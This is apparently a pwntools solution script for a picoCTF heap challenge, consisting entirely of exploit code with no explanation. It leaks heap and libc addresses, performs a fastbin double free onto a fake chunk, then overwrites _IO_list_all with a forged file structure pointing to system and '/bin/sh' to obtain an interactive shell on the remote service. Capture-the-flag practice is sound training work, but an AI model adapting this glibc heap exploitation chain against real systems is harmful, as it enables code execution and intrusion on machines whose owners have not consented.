from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'fickle-tempest.picoctf.net', 55164
r = remote(HOST, PORT)

def introduce(data):
    r.sendline(data)

def add(data, size):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'> ', f'{size}'.encode())
    r.sendlineafter(b'> ', data)

def free(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'> ', str(idx).encode())

def reintroduce(data):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'> ', data)

introduce(b'')
add(b'', 50)
add(b'', 50)
reintroduce(b'A' * (0x100-1))
r.recvuntil(b'A\n')
heap_leak = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
heap_base = heap_leak - 0x10

fake_chunk = flat([
    p64(0), p64(0x41), p64(0) * 6, p64(0x41), p64(0x41)
])
reintroduce(fake_chunk)

free(0)
free(1)
free(0)
add(p64(0x602040), 50)
add(b'', 50)
add(b'', 50)
add(b'', 50)
unsorted_chunk = flat([
    p64(0), p64(0x91), p64(0) * 16, p64(0x91), p64(0x41)
])
reintroduce(unsorted_chunk)
free(5)

reintroduce(b'A' * 15)
r.recvline()
main_arena_88 = u64(r.recvline().strip(b'!\n').ljust(8, b'\x00'))
libc = main_arena_88 - 0x3c4b78
IO_list_all = libc + 0x3c5520
system = libc + 0x45390

payload = flat([
    b'/bin/sh\x00' + p64(0x61),
    p64(main_arena_88) + p64(IO_list_all-0x10),
    p64(0) + p64(1),
    p64(system) * 18,
    p64(0),
    p64(0) * 2,
    p64(0x602040+0x30)
])
reintroduce(payload)

r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'> ', b'50')
r.interactive()